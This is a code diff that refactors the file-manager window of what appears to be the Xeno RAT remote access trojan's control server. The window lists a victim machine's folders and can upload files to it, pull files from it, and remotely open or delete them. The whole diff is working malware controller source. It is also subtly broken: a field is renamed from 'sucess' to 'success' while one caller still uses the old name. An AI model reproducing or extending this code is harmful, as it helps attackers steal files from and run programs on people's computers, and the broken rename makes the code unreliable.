@@ -9,35 +9,37 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using static System.Windows.Forms.VisualStyles.VisualStyleElement;
 
-namespace xeno_rat_server.Forms
+namespace XenoRatServer.Forms
 {
-    public partial class File_manager : Form
+    public partial class FileManager : Form
     {
-        Node client;
-        FileView FileViewer;
-        string currentDirectory = "";
-        public File_manager(Node _client)
+        private Node client;
+        private FileView fileViewer;
+        private string currentDirectory = "";
+
+        public FileManager(Node _client)
         {
             client = _client;
             InitializeComponent();
             client.AddTempOnDisconnect(TempOnDisconnect);
-            _=InitializeAsync();
+            _ = InitializeAsync();
         }
-        public async Task InitializeAsync() 
+
+        public async Task InitializeAsync()
         {
-            FileViewer = new FileView(await CreateSubSubNode(client));
-            await FileViewer.SendType();
+            fileViewer = new FileView(await CreateSubSubNode(client));
+            await fileViewer.SendType();
             await UpdateListViewNonInvoke(currentDirectory);
         }
+
         public void TempOnDisconnect(Node node)
         {
             if (node == client)
             {
-                if (FileViewer != null) 
-                { 
-                    FileViewer.client.Disconnect();
+                if (fileViewer != null)
+                {
+                    fileViewer.client.Disconnect();
                 }
                 if (!this.IsDisposed)
                 {
@@ -48,6 +50,7 @@ namespace xeno_rat_server.Forms
                 }
             }
         }
+
         public async Task FileUpload(string filepath, string savepath)
         {
             Node node = await CreateSubSubNode(client);
@@ -136,7 +139,6 @@ namespace xeno_rat_server.Forms
             node.Disconnect();
         }
 
-
         public async Task FileDownload(string path, string savepath)
         {
             Node node = await CreateSubSubNode(client);
@@ -158,7 +160,7 @@ namespace xeno_rat_server.Forms
             }
             long fileSize = Utils.BytesToLong(await node.ReceiveAsync());
             long receivedBytes = 0;
-            bool failed=false;
+            bool failed = false;
             ListViewItem lvi = new ListViewItem();
             lvi.Text = path;
             lvi.SubItems.Add("0%");
@@ -179,7 +181,7 @@ namespace xeno_rat_server.Forms
                         byte[] fileData = await node.ReceiveAsync();
                         if (fileData == null)
                         {
-                            if (fileStream.Length == fileSize) 
+                            if (fileStream.Length == fileSize)
                             {
                                 break;
                             }
@@ -234,7 +236,7 @@ namespace xeno_rat_server.Forms
             node.Disconnect();
         }
 
-        public async Task StartFile(string path) 
+        public async Task StartFile(string path)
         {
             Node node = await CreateSubSubNode(client);
             byte[] type = new byte[] { 3 };
@@ -254,6 +256,7 @@ namespace xeno_rat_server.Forms
                 return;
             }
         }
+
         public async Task DeleteFile(string path)
         {
             Node node = await CreateSubSubNode(client);
@@ -274,13 +277,14 @@ namespace xeno_rat_server.Forms
                 return;
             }
         }
+
         private async Task UpdateListViewNonInvoke(string path)
         {
-            FileData Data = await FileViewer.GetInfo(path);
+            FileData Data = await fileViewer.GetInfo(path);
             if (!Data.sucess)
             {
                 textBox1.Text = currentDirectory;
-                MessageBox.Show("There was a problem access that Directory, most likely access denied");
+                MessageBox.Show("There was a problem accessing that Directory, most likely access denied");
                 return;
             }
             currentDirectory = path;
@@ -324,7 +328,7 @@ namespace xeno_rat_server.Forms
                 await Utils.Type2returnAsync(SubSubNode);
                 byte[] a = SubSubNode.sock.IntToBytes(id);
                 await client.SendAsync(a);
-                byte[] found =await client.ReceiveAsync();
+                byte[] found = await client.ReceiveAsync();
                 if (found == null || found[0] == 0)
                 {
                     SubSubNode.Disconnect();
@@ -339,30 +343,28 @@ namespace xeno_rat_server.Forms
             return SubSubNode;
         }
 
-        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
-        {
-
-        }
-
         private async void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
         {
-            string path = listView1.SelectedItems[0].Tag as string;
-            string dir = listView1.SelectedItems[0].SubItems[0].Text;
-            string type = listView1.SelectedItems[0].SubItems[1].Text;
-            if (type != "Directory") return;
-            if (dir == "..")
+            if (listView1.SelectedItems.Count > 0)
             {
-                string newpath = "";
-                if (Path.GetPathRoot(path) != path)
+                string path = listView1.SelectedItems[0].Tag as string;
+                string dir = listView1.SelectedItems[0].SubItems[0].Text;
+                string type = listView1.SelectedItems[0].SubItems[1].Text;
+                if (type != "Directory") return;
+                if (dir == "..")
                 {
-                    newpath = Path.GetFullPath(Path.Combine(path, ".."));
+                    string newpath = "";
+                    if (Path.GetPathRoot(path) != path)
+                    {
+                        newpath = Path.GetFullPath(Path.Combine(path, ".."));
+                    }
+                    await UpdateListViewNonInvoke(newpath);
                 }
-                await UpdateListViewNonInvoke(newpath);
-            }
-            else 
-            { 
-                string newpath= Path.GetFullPath(Path.Combine(currentDirectory, dir));
-                await UpdateListViewNonInvoke(newpath);
+                else
+                {
+                    string newpath = Path.GetFullPath(Path.Combine(currentDirectory, dir));
+                    await UpdateListViewNonInvoke(newpath);
+                }
             }
         }
 
@@ -376,47 +378,78 @@ namespace xeno_rat_server.Forms
             }
         }
 
-        private void listView2_SelectedIndexChanged(object sender, EventArgs e)
+        private async void button1_Click(object sender, EventArgs e)
         {
-
+            await UpdateListViewNonInvoke(currentDirectory);
         }
-        private void DownloadMenuItem_Click(object sender, EventArgs e)
+
+        private async void button2_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog openFileDialog = new OpenFileDialog();
+            openFileDialog.Title = "Select File";
+            openFileDialog.Filter = "All Files (*.*)|*.*";
+            openFileDialog.CheckFileExists = true;
+
+            if (openFileDialog.ShowDialog() == DialogResult.OK)
+            {
+                string filePath = openFileDialog.FileName;
+                string fileName = Path.GetFileName(filePath);
+                string savePath = Path.Combine(currentDirectory, fileName);
+
+                _ = FileUpload(filePath, savePath);
+            }
+        }
+
+        private async void listView1_MouseClick(object sender, MouseEventArgs e)
+        {
+            if (e.Button == MouseButtons.Right)
+            {
+                ListViewItem selectedItem = listView1.FocusedItem;
+                if (selectedItem != null && selectedItem.SubItems[1].Text == "File")
+                {
+                    ContextMenu contextMenu = new ContextMenu();
+
+                    MenuItem downloadMenuItem = new MenuItem("Download");
+                    downloadMenuItem.Tag = selectedItem;
+                    downloadMenuItem.Click += DownloadMenuItem_Click;
+                    contextMenu.MenuItems.Add(downloadMenuItem);
+
+                    MenuItem openMenuItem = new MenuItem("Open");
+                    openMenuItem.Tag = selectedItem;
+                    openMenuItem.Click += OpenMenuItem_Click;
+                    contextMenu.MenuItems.Add(openMenuItem);
+
+                    MenuItem deleteMenuItem = new MenuItem("Delete");
+                    deleteMenuItem.Tag = selectedItem;
+                    deleteMenuItem.Click += DeleteMenuItem_Click;
+                    contextMenu.MenuItems.Add(deleteMenuItem);
+
+                    contextMenu.Show(listView1, e.Location);
+                }
+            }
+        }
+
+        private async void DownloadMenuItem_Click(object sender, EventArgs e)
         {
             MenuItem menuItem = (MenuItem)sender;
             ListViewItem selectedItem = (ListViewItem)menuItem.Tag;
-
-            // Get the necessary information from the selected item
             string path = (string)selectedItem.Tag;
+            SaveFileDialog saveFileDialog = new SaveFileDialog();
+            saveFileDialog.FileName = Path.GetFileName(path);
+            saveFileDialog.Filter = "All Files (*.*)|*.*";
 
-            // Create and configure the SaveFileDialog in a new STA thread
-            Thread staThread = new Thread(() =>
+            if (saveFileDialog.ShowDialog() == DialogResult.OK)
             {
-                SaveFileDialog saveFileDialog = new SaveFileDialog();
-                saveFileDialog.FileName = Path.GetFileName(path); // Set the default file name
-                saveFileDialog.Filter = "All Files (*.*)|*.*"; // Specify the file type filter
-
-                if (saveFileDialog.ShowDialog() == DialogResult.OK)
-                {
-                    string savepath = saveFileDialog.FileName;
-
-                    // Call the FileDownload method or perform the download logic here
-                    _ = FileDownload(path, savepath);
-                }
-            });
-
-            staThread.SetApartmentState(ApartmentState.STA); // Set the thread's apartment state to STA
-            staThread.Start();
+                string savepath = saveFileDialog.FileName;
+                await FileDownload(path, savepath);
+            }
         }
-
-
 
         private async void OpenMenuItem_Click(object sender, EventArgs e)
         {
             MenuItem menuItem = (MenuItem)sender;
             ListViewItem selectedItem = (ListViewItem)menuItem.Tag;
-
             string filePath = (string)selectedItem.Tag;
-
             await StartFile(filePath);
         }
 
@@ -424,121 +457,58 @@ namespace xeno_rat_server.Forms
         {
             MenuItem menuItem = (MenuItem)sender;
             ListViewItem selectedItem = (ListViewItem)menuItem.Tag;
-
             string filePath = (string)selectedItem.Tag;
-
             await DeleteFile(filePath);
             await UpdateListViewNonInvoke(currentDirectory);
-
         }
-        private void listView1_MouseClick(object sender, MouseEventArgs e)
-        {
-            if (e.Button == MouseButtons.Right)
-            {
-                
-                ListViewItem selectedItem = listView1.FocusedItem;
-                if (selectedItem != null && selectedItem.SubItems[1].Text=="File")
-                {
-                    ContextMenu contextMenu = new ContextMenu();
-
-                    // Download option
-                    MenuItem downloadMenuItem = new MenuItem("Download");
-                    downloadMenuItem.Tag = selectedItem;
-                    downloadMenuItem.Click += DownloadMenuItem_Click;
-                    contextMenu.MenuItems.Add(downloadMenuItem);
-
-                    // Open option
-                    MenuItem openMenuItem = new MenuItem("Open");
-                    openMenuItem.Tag = selectedItem;
-                    openMenuItem.Click += OpenMenuItem_Click;
-                    contextMenu.MenuItems.Add(openMenuItem);
-
-                    // Delete option
-                    MenuItem deleteMenuItem = new MenuItem("Delete");
-                    deleteMenuItem.Tag = selectedItem;
-                    deleteMenuItem.Click += DeleteMenuItem_Click;
-                    contextMenu.MenuItems.Add(deleteMenuItem);
-
-                    // Show the context menu at the mouse position
-                    contextMenu.Show(listView1, e.Location);
-                }
-            }
-        }
-
-        private async void button1_Click(object sender, EventArgs e)
-        {
-           await UpdateListViewNonInvoke(currentDirectory);
-        }
-
-        private void button2_Click(object sender, EventArgs e)
-        {
-            Thread staThread = new Thread(() =>
-            {
-                OpenFileDialog openFileDialog = new OpenFileDialog();
-                openFileDialog.Title = "Select File";
-                openFileDialog.Filter = "All Files (*.*)|*.*";
-                openFileDialog.CheckFileExists = true;
-
-                if (openFileDialog.ShowDialog() == DialogResult.OK)
-                {
-                    string filePath = openFileDialog.FileName;
-                    string fileName = Path.GetFileName(filePath);
-                    string savePath = Path.Combine(currentDirectory, fileName);
-
-                    _ = FileUpload(filePath, savePath);
-                }
-            });
-
-            staThread.SetApartmentState(ApartmentState.STA); // Set the thread's apartment state to STA
-            staThread.Start();
-        }
-
-
     }
-    class FileData 
+
+    class FileData
     {
-        public bool sucess = true;
-        public List<string> Directories= new List<string>();
+        public bool success = true;
+        public List<string> Directories = new List<string>();
         public List<string> Files = new List<string>();
     }
+
     class FileView
     {
         public Node client;
+
         public FileView(Node _client)
         {
             client = _client;
         }
-        public async Task SendType() 
+
+        public async Task SendType()
         {
             byte[] type = new byte[] { 0 };
             await client.SendAsync(type);
         }
-        public async Task<FileData> GetInfo(string path) 
+
+        public async Task<FileData> GetInfo(string path)
         {
             FileData data = new FileData();
             byte[] byte_path = Encoding.UTF8.GetBytes(path);
             await client.SendAsync(byte_path);
-            bool worked = (await client.ReceiveAsync())[0]==1;
+            bool worked = (await client.ReceiveAsync())[0] == 1;
             if (worked)
             {
-                int dirslength = client.sock.BytesToInt(await client.ReceiveAsync());
-                for (int _=0;_< dirslength; _++) 
+                int dirsLength = client.sock.BytesToInt(await client.ReceiveAsync());
+                for (int _ = 0; _ < dirsLength; _++)
                 {
                     data.Directories.Add(Encoding.UTF8.GetString(await client.ReceiveAsync()));
                 }
-                int fileslength = client.sock.BytesToInt(await client.ReceiveAsync());
-                for (int _ = 0; _ < fileslength; _++)
+                int filesLength = client.sock.BytesToInt(await client.ReceiveAsync());
+                for (int _ = 0; _ < filesLength; _++)
                 {
                     data.Files.Add(Encoding.UTF8.GetString(await client.ReceiveAsync()));
                 }
             }
-            else 
+            else
             {
-                data.sucess = false;
+                data.success = false;
             }
             return data;
-
         }
-        
     }
 }
